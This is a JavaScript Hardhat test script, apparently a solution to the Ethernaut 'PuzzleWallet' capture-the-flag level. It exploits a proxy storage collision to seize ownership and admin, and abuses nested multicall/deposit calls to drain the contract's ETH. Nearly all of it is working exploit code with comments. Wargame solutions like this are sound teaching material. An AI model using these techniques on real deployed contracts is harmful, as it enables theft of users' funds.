const {ethers, network} = require("hardhat")
const {BigNumber, Contract, Signer} = require("ethers");
const {expect, assert} = require("chai")
const {getContract, sleep} = require("./helpers");
const targetName = "PuzzleWallet";
const targetFactoryName = "PuzzleWalletFactory";

describe(`${targetName} challenge`, function () {

    let accounts, player, target, attacker;
    let targetAddress;
    let proxy, owner;

    beforeEach(async () => {
        accounts = await ethers.getSigners();
        player = (await accounts[0]).address;
        console.log(`Player = ${player}`);
        if (network.name === 'rinkeby') {
            assert.equal(player, '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
                `Address at first account (${player}) is not correct.`);
            targetAddress = '0xe68e6518AAeFe2fe0628641D735AF066dc9E7ab3';
        }

        if (network.name === 'hardhat') {
            const levelFactory = await getContract(targetFactoryName);
            console.log(`${targetFactoryName}.address `, await levelFactory.address);
            let txn = await levelFactory.createInstance(player, {
                value: ethers.utils.parseEther('0.001')
            });
            txn.wait(1);

            let receipt = await ethers.provider.getTransactionReceipt(txn.hash);
            console.log(`Create contract instance receipt: `, receipt);
            targetAddress = await receipt.to;

            console.log(receipt);
            const log = levelFactory.interface.parseLog(receipt.logs[0]);
            targetAddress = log.args.instance;

            console.log(`Deployed ${targetName} using level factory at ${await levelFactory.address} to ${targetAddress}`);
            target = await getContract(targetName, targetAddress);
        } else {
            target = await getContract(targetName, targetAddress);
        }
        assert.isNotNull(target);
        console.log(`${targetName} address = ${await target.address}`);

        proxy = await getContract("PuzzleProxy", targetAddress);
        owner = await target.owner();
        console.log("Original owner = ", owner);
        //assert.notEqual(player, owner);
    });

    it(`Solves ${targetName} challenge`, async () => {
        assert.isNotNull(player);
        if (player === (await proxy.admin())) {
            console.log(`${player} is already admin of ${await target.address}, nothing to do here.`);
            return;
        }

        let txn;
        if(owner !== player) {
            // The proxy and target share memory space, in this case the target's owner
            // is at the same memory address as the proxy's proposedAdmin. Therefore,
            // proposing an admin clobbers the wallet's owner, making `player` the owner.
            txn = await proxy.proposeNewAdmin(player);
            txn.wait();
            let pendingAdmin = await proxy.pendingAdmin();
            assert.equal(pendingAdmin, player);
            console.log("Pending Admin: ", pendingAdmin);

            const exploitedOwner = await target.owner();
            console.log("Exploited Owner = ", exploitedOwner);
            //assert.notEqual(owner, exploitedOwner);
            assert.equal(player, exploitedOwner);
        } else {
            console.log(`${player} is already owner of contract.`);
        }
        if (!(await target.whitelisted[player])) {
            // since we own the contract now, we can add ourselves to the
            // whitelist. Before doing this we could not use any of the
            // functions that are needed exploit the contract and become admin.
            txn = await target.addToWhitelist(player);
            txn.wait(1);
            assert.isNotNull(txn.hash);
            console.log(`Added ${player} to whitelist with txn.hash = ${txn.hash}.`);
        } else {
            console.log(`${player} is already whitelisted with contract.`);
        }

        // before continuing, asser the current value in the contract's balance.
        const originalBalance = (await ethers.provider.getBalance(await target.address)).toNumber();
        if( originalBalance > 0) {
            assert.equal(BigNumber.from(originalBalance), ethers.utils.parseEther("0.001"));

            // Now we can use the multicall function to drain the contract balance. The multicall
            // function attempts to protect itself from multiple deposits, but does so weakly. Let's
            // walk through what can be done to take advantage of the function.
            // Create a reference to the `deposit()` function so it can be used in more than one place.
            const depositData = target.interface.encodeFunctionData("deposit");

            // Create a nested call to `multicall`, which will then call `deposit`
            const nestedMulticallData = target.interface.encodeFunctionData("multicall", [
                [depositData]
            ]);
            // this instructs the multicall function to invoke the `execute()` function, which
            // transfers the balance of the contract into the player's account.
            const executeData = target.interface.encodeFunctionData("execute", [
                player, ethers.utils.parseEther("0.002"), []
            ]);
            // The `multicall()` function only allows one call to the deposit() function, but
            // does not check that it is called recursively. So we can exploit that and have it
            // think our 0.001 ETH was deposited twice. Then the final use of `execute()` transfers
            // all the ETH from the contract to the player, thereby making the check of the
            // contract balance report 0.
            const multicallArg = [
                depositData,
                nestedMulticallData,
                executeData
            ];
            const multicallResponse = await target.multicall(multicallArg, {
                from: player,
                value: ethers.utils.parseEther('0.001'),
                gasPrice: ethers.utils.parseEther('0.000000005')
            });
            txn = multicallResponse.wait();
            assert.isNotNull(txn.hash);
            console.log(`Executed multicall function with txn.hash = ${txn.hash}.`);

            const currentBalance = (await ethers.provider.getBalance(await target.address)).toNumber();
            console.log("balances = ", {
                "original": ethers.utils.formatEther(originalBalance),
                "current": ethers.utils.formatEther(currentBalance)
            });
            assert.notEqual(currentBalance, originalBalance);
            assert.equal(currentBalance, 0);
        } else {
            console.log(`Current balance of contract is already ${originalBalance}.`);
        }
        // Since the balance was drained, calling `setMaxBalance()` will succeed and
        // set the argument value as the new `maxBalance`. However, since the `maxBalance`
        // variable occupies the same memory address as the proxy's `admin` variable, the
        // `admin` is set by passing the player's address as the desired `maxBalance`.
        txn = await target.setMaxBalance(player, { from: player });
        txn.wait(1);
        assert.isNotNull(txn.hash);

        await sleep(2500);
        assert.equal(player, (await proxy.admin()));
    });
});